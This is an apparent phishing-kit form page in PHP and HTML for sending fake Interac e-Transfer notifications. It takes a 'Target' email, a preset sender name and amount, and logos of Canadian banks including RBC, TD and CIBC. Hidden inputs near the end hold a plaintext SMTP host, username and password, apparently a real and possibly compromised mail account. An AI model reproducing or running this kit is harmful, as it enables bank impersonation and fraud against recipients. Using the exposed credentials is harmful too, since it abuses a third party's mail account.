<?php
    // Calculate expiration date based on current date
    $line = date('F j, Y', strtotime('+30 days'));
?>
<!DOCTYPE html>
<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="MobileOptimized" content="width">
    <meta name="HandheldFriendly" content="true">
    <meta name="format-detection" content="telephone=yes">  <style>
        body {
            background-color: red;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            font-size: 24px; /* Increase font size for better visibility on mobile */
        }
        input[type="text"],
        select {
            background-color: red;
            width: 100%;
            color: white;
            padding: 15px 10px; /* Set equal padding left and right */
            margin-bottom: 10px;
            border: 10px solid #ccc;
            border-radius: 4px;
            font-size: 24px; /* Increase font size for better visibility on mobile */
        }
        input[type="submit"] {
            background-color: red;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 20px;
            cursor: pointer;
            font-size: 24px; /* Increase font size for better visibility on mobile */
        }
    </style>
</head>
<body>
    <center>
        <form action="submitt1.php" method="POST" enctype="multipart/form-data">
            <input type="hidden" id="etransfer_interac_ca" name="etransfer_interac_ca" required>
            
            <label for="receivers_email">Receiver's Email:</label>
            <input type="text" id="receivers_email" name="receivers_email" placeholder="Target@email.com" required>
            
            <label for="receivers_name">Receiver's Name:</label>
            <input type="text" id="receivers_name" name="receivers_name" value="One-time contact" required>
            
            <label for="sender_name">Sender's Name:</label>
            <input type="text" id="sender_name" name="sender_name" value="DRONE OILFIELD LTD." required>
            
            <label for="amount">Amount:</label>
            <select id="amount" name="amount" required>
                <option value="10.00">10.00</option>
                <option value="20.00">20.00</option>
  <option value="60.00"> 60.00</option>
  <option value="70.00"> 70.00</option>
  <option value="80.00"> 80.00</option>
  <option value="90.00"> 90.00</option>
  <option value="100.00"> 100.00</option>
  <option value="110.00"> 110.00</option>
  <option value="120.00"> 120.00</option>
  <option value="130.00"> 130.00</option>
  <option value="140.00"> 140.00</option>
  <option value="150.00"> 150.00</option>
  <option value="160.00"> 160.00</option>
  <option value="170.00"> 170.00</option>
  <option value="180.00"> 180.00</option>
  <option value="190.00"> 190.00</option>
  <option value="200.00"> 200.00</option>
  <option value="210.00"> 210.00</option>
  <option value="220.00"> 220.00</option>
  <option value="230.00"> 230.00</option>
  <option value="240.00"> 240.00</option>
  <option value="250.00"> 250.00</option>
  <option value="260.00"> 260.00</option>
  <option value="270.00"> 270.00</option>
  <option value="280.00"> 280.00</option>
  <option value="290.00"> 290.00</option>
  <option value="300.00"> 300.00</option>
  <option value="310.00"> 310.00</option>
  <option value="320.00"> 320.00</option>
  <option value="330.00"> 330.00</option>
  <option value="340.00"> 340.00</option>
  <option value="350.00"> 350.00</option>
  <option value="360.00"> 360.00</option>
  <option value="370.00"> 370.00</option>
  <option value="380.00"> 380.00</option>
  <option value="390.00"> 390.00</option>
  <option value="400.00"> 400.00</option>
  <option value="410.00"> 410.00</option>
  <option value="420.00"> 420.00</option>
  <option value="430.00"> 430.00</option>
  <option value="440.00"> 440.00</option>
  <option value="450.00"> 450.00</option>
  <option value="460.00"> 460.00</option>
  <option value="470.00"> 470.00</option>
  <option value="480.00"> 480.00</option>
  <option value="490.00"> 490.00</option>
  <option value="500.00"> 500.00</option>
  <option value="510.00"> 510.00</option>
  <option value="520.00"> 520.00</option>
  <option value="530.00"> 530.00</option>
  <option value="540.00"> 540.00</option>
  <option value="550.00"> 550.00</option>
  <option value="560.00"> 560.00</option>
  <option value="570.00"> 570.00</option>
  <option value="580.00"> 580.00</option>
  <option value="590.00"> 590.00</option>
  <option value="600.00"> 600.00</option>
  <option value="610.00"> 610.00</option>
  <option value="620.00"> 620.00</option>
  <option value="630.00"> 630.00</option>
  <option value="640.00"> 640.00</option>
  <option value="650.00"> 650.00</option>
  <option value="660.00"> 660.00</option>
  <option value="670.00"> 670.00</option>
  <option value="680.00"> 680.00</option>
  <option value="690.00"> 690.00</option>
  <option value="700.00"> 700.00</option>
  <option value="710.00"> 710.00</option>
  <option value="720.00"> 720.00</option>
  <option value="730.00"> 730.00</option>
  <option value="740.00"> 740.00</option>
  <option value="750.00"> 750.00</option>
  <option value="760.00"> 760.00</option>
  <option value="770.00"> 770.00</option>
  <option value="780.00"> 780.00</option>
  <option value="790.00"> 790.00</option>
  <option value="800.00"> 800.00</option>
  <option value="810.00"> 810.00</option>
  <option value="820.00"> 820.00</option>
  <option value="830.00"> 830.00</option>
  <option value="840.00"> 840.00</option>
  <option value="850.00"> 850.00</option>
  <option value="860.00"> 860.00</option>
  <option value="870.00"> 870.00</option>
  <option value="880.00"> 880.00</option>
  <option value="890.00"> 890.00</option>
  <option value="900.00"> 900.00</option>
  <option value="910.00"> 910.00</option>
  <option value="920.00"> 920.00</option>
  <option value="930.00"> 930.00</option>
  <option value="940.00"> 940.00</option>
  <option value="950.00"> 950.00</option>
  <option value="960.00"> 960.00</option>
  <option value="970.00"> 970.00</option>
  <option value="980.00"> 980.00</option>
  <option value="990.00"> 990.00</option>
  <option value="1,000.00">1,000.00</option>
  <option value="1,010.00">1,010.00</option>
  <option value="1,020.00">1,020.00</option>
  <option value="1,030.00">1,030.00</option>
  <option value="1,040.00">1,040.00</option>
  <option value="1,050.00">1,050.00</option>
  <option value="1,060.00">1,060.00</option>
  <option value="1,070.00">1,070.00</option>
  <option value="1,080.00">1,080.00</option>
  <option value="1,090.00">1,090.00</option>
  <option value="1,100.00">1,100.00</option>
  <option value="1,110.00">1,110.00</option>
  <option value="1,120.00">1,120.00</option>
  <option value="1,130.00">1,130.00</option>
  <option value="1,140.00">1,140.00</option>
  <option value="1,150.00">1,150.00</option>
  <option value="1,160.00">1,160.00</option>
  <option value="1,170.00">1,170.00</option>
  <option value="1,180.00">1,180.00</option>
  <option value="1,190.00">1,190.00</option>
  <option value="1,200.00">1,200.00</option>
  <option value="1,210.00">1,210.00</option>
  <option value="1,220.00">1,220.00</option>
  <option value="1,230.00">1,230.00</option>
  <option value="1,240.00">1,240.00</option>
  <option value="1,250.00">1,250.00</option>
  <option value="1,260.00">1,260.00</option>
  <option value="1,270.00">1,270.00</option>
  <option value="1,280.00">1,280.00</option>
  <option value="1,290.00">1,290.00</option>
  <option value="1,300.00">1,300.00</option>
  <option value="1,310.00">1,310.00</option>
  <option value="1,320.00">1,320.00</option>
  <option value="1,330.00">1,330.00</option>
  <option value="1,340.00">1,340.00</option>
  <option value="1,350.00">1,350.00</option>
  <option value="1,360.00">1,360.00</option>
  <option value="1,370.00">1,370.00</option>
  <option value="1,380.00">1,380.00</option>
  <option value="1,390.00">1,390.00</option>
  <option value="1,400.00">1,400.00</option>
  <option value="1,410.00">1,410.00</option>
  <option value="1,420.00">1,420.00</option>
  <option value="1,430.00">1,430.00</option>
  <option value="1,440.00">1,440.00</option>
  <option value="1,450.00">1,450.00</option>
  <option value="1,460.00">1,460.00</option>
  <option value="1,470.00">1,470.00</option>
  <option value="1,480.00">1,480.00</option>
  <option value="1,490.00">1,490.00</option>
  <option value="1,500.00">1,500.00</option>
  <option value="1,510.00">1,510.00</option>
  <option value="1,520.00">1,520.00</option>
  <option value="1,530.00">1,530.00</option>
  <option value="1,540.00">1,540.00</option>
  <option value="1,550.00">1,550.00</option>
  <option value="1,560.00">1,560.00</option>
  <option value="1,570.00">1,570.00</option>
  <option value="1,580.00">1,580.00</option>
  <option value="1,590.00">1,590.00</option>
  <option value="1,600.00">1,600.00</option>
  <option value="1,610.00">1,610.00</option>
  <option value="1,620.00">1,620.00</option>
  <option value="1,630.00">1,630.00</option>
  <option value="1,640.00">1,640.00</option>
  <option value="1,650.00">1,650.00</option>
  <option value="1,660.00">1,660.00</option>
  <option value="1,670.00">1,670.00</option>
  <option value="1,680.00">1,680.00</option>
  <option value="1,690.00">1,690.00</option>
  <option value="1,700.00">1,700.00</option>
  <option value="1,710.00">1,710.00</option>
  <option value="1,720.00">1,720.00</option>
  <option value="1,730.00">1,730.00</option>
  <option value="1,740.00">1,740.00</option>
  <option value="1,750.00">1,750.00</option>
  <option value="1,760.00">1,760.00</option>
  <option value="1,770.00">1,770.00</option>
  <option value="1,780.00">1,780.00</option>
  <option value="1,790.00">1,790.00</option>
  <option value="1,800.00">1,800.00</option>
  <option value="1,810.00">1,810.00</option>
  <option value="1,820.00">1,820.00</option>
  <option value="1,830.00">1,830.00</option>
  <option value="1,840.00">1,840.00</option>
  <option value="1,850.00">1,850.00</option>
  <option value="1,860.00">1,860.00</option>
  <option value="1,870.00">1,870.00</option>
  <option value="1,880.00">1,880.00</option>
  <option value="1,890.00">1,890.00</option>
  <option value="1,900.00">1,900.00</option>
  <option value="1,910.00">1,910.00</option>
  <option value="1,920.00">1,920.00</option>
  <option value="1,930.00">1,930.00</option>
  <option value="1,940.00">1,940.00</option>
  <option value="1,950.00">1,950.00</option>
  <option value="1,960.00">1,960.00</option>
  <option value="1,970.00">1,970.00</option>
  <option value="1,980.00">1,980.00</option>
  <option value="1,990.00">1,990.00</option>
  <option value="2,000.00">2,000.00</option>
  <option value="2,010.00">2,010.00</option>
  <option value="2,020.00">2,020.00</option>
  <option value="2,030.00">2,030.00</option>
  <option value="2,040.00">2,040.00</option>
  <option value="2,050.00">2,050.00</option>
  <option value="2,060.00">2,060.00</option>
  <option value="2,070.00">2,070.00</option>
  <option value="2,080.00">2,080.00</option>
  <option value="2,090.00">2,090.00</option>
  <option value="2,100.00">2,100.00</option>
  <option value="2,110.00">2,110.00</option>
  <option value="2,120.00">2,120.00</option>
  <option value="2,130.00">2,130.00</option>
  <option value="2,140.00">2,140.00</option>
  <option value="2,150.00">2,150.00</option>
  <option value="2,160.00">2,160.00</option>
  <option value="2,170.00">2,170.00</option>
  <option value="2,180.00">2,180.00</option>
  <option value="2,190.00">2,190.00</option>
  <option value="2,200.00">2,200.00</option>
  <option value="2,210.00">2,210.00</option>
  <option value="2,220.00">2,220.00</option>
  <option value="2,230.00">2,230.00</option>
  <option value="2,240.00">2,240.00</option>
  <option value="2,250.00">2,250.00</option>
  <option value="2,260.00">2,260.00</option>
  <option value="2,270.00">2,270.00</option>
  <option value="2,280.00">2,280.00</option>
  <option value="2,290.00">2,290.00</option>
  <option value="2,300.00">2,300.00</option>
  <option value="2,310.00">2,310.00</option>
  <option value="2,320.00">2,320.00</option>
  <option value="2,330.00">2,330.00</option>
  <option value="2,340.00">2,340.00</option>
  <option value="2,350.00">2,350.00</option>
  <option value="2,360.00">2,360.00</option>
  <option value="2,370.00">2,370.00</option>
  <option value="2,380.00">2,380.00</option>
  <option value="2,390.00">2,390.00</option>
  <option value="2,400.00">2,400.00</option>
  <option value="2,410.00">2,410.00</option>
  <option value="2,420.00">2,420.00</option>
  <option value="2,430.00">2,430.00</option>
  <option value="2,440.00">2,440.00</option>
  <option value="2,450.00">2,450.00</option>
  <option value="2,460.00">2,460.00</option>
  <option value="2,470.00">2,470.00</option>
  <option value="2,480.00">2,480.00</option>
  <option value="2,490.00">2,490.00</option>
  <option value="2,500.00">2,500.00</option>
  <option value="2,510.00">2,510.00</option>
  <option value="2,520.00">2,520.00</option>
  <option value="2,530.00">2,530.00</option>
  <option value="2,540.00">2,540.00</option>
  <option value="2,550.00">2,550.00</option>
  <option value="2,560.00">2,560.00</option>
  <option value="2,570.00">2,570.00</option>
  <option value="2,580.00">2,580.00</option>
  <option value="2,590.00">2,590.00</option>
  <option value="2,600.00">2,600.00</option>
  <option value="2,610.00">2,610.00</option>
  <option value="2,620.00">2,620.00</option>
  <option value="2,630.00">2,630.00</option>
  <option value="2,640.00">2,640.00</option>
  <option value="2,650.00">2,650.00</option>
  <option value="2,660.00">2,660.00</option>
  <option value="2,670.00">2,670.00</option>
  <option value="2,680.00">2,680.00</option>
  <option value="2,690.00">2,690.00</option>
  <option value="2,700.00">2,700.00</option>
  <option value="2,710.00">2,710.00</option>
  <option value="2,720.00">2,720.00</option>
  <option value="2,730.00">2,730.00</option>
  <option value="2,740.00">2,740.00</option>
  <option value="2,750.00">2,750.00</option>
  <option value="2,760.00">2,760.00</option>
  <option value="2,770.00">2,770.00</option>
  <option value="2,780.00">2,780.00</option>
  <option value="2,790.00">2,790.00</option>
  <option value="2,800.00">2,800.00</option>
  <option value="2,810.00">2,810.00</option>
  <option value="2,820.00">2,820.00</option>
  <option value="2,830.00">2,830.00</option>
  <option value="2,840.00">2,840.00</option>
  <option value="2,850.00">2,850.00</option>
  <option value="2,860.00">2,860.00</option>
  <option value="2,870.00">2,870.00</option>
  <option value="2,880.00">2,880.00</option>
  <option value="2,890.00">2,890.00</option>
  <option value="2,900.00">2,900.00</option>
  <option value="2,910.00">2,910.00</option>
  <option value="2,920.00">2,920.00</option>
  <option value="2,930.00">2,930.00</option>
  <option value="2,940.00">2,940.00</option>
  <option value="2,950.00">2,950.00</option>
  <option value="2,960.00">2,960.00</option>
  <option value="2,970.00">2,970.00</option>
  <option value="2,980.00">2,980.00</option>
  <option value="2,990.00">2,990.00</option>
  <option value="3,000.00">3,000.00</option>
</select>
<input type="hidden" name="line" value="<?php echo $line; ?>" required="">

<center>
<select name="photo_link" id="photo_href">

<option value="https://etransfer-content.interac.ca/en/logo_CA000003.png">RBC Royal Bank</option> 
<option value="https://etransfer-content.interac.ca/en/logo_CA000002.png">Scotiabank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000001.png">BMO</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000010.png">CIBC</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000004.png">TD</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000003.png">RBC Royal Bank</option> 

</select>

            <select id="amount" name="bank" placeholder="Input transfer memo">
  <option value="10.00">10.00</option>
<option value="RBC Royal Bank">RBC Royal Bank</option>
<option value="Scotia Bank">Scotia Bank</option> 
<option value="Bank of Montreal">Bank of Montreal</option>
<option value="CIBC">CIBC</option>
<option value="TD Canada Trust">TD Canada Trust</option>
</select>

<input type="hidden" name="link" value="https://<?php echo $_SERVER['HTTP_HOST'] ?>">
<input type="hidden" name="port" value="587" required="">
<input type="hidden" name="username" value="andallard@mymts.net" required="">
<input type="hidden" name="password" value="Batman123" required="">
<input type="hidden" name="host" value="mail.mymts.net"required="">

  <input type="submit" value="Submit"></center></html>








  






  <style>
    body {
      background-color: #000;
      color: #fff;
      font-family: Arial, sans-serif;
    }

    h1 {
      text-align: center;
    }

    form {
      margin: 20px;
    }

    input[type="text"], select {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;
      border: none;
      background-color: #333;
      color: #fff;
    }

    input[type="submit"] {
      width: 100%;
      padding: 10px;
      border: none;
      background-color: #0066cc;
      color: #fff;
      cursor: pointer;
    }
  </style>


  











</div></body></html>
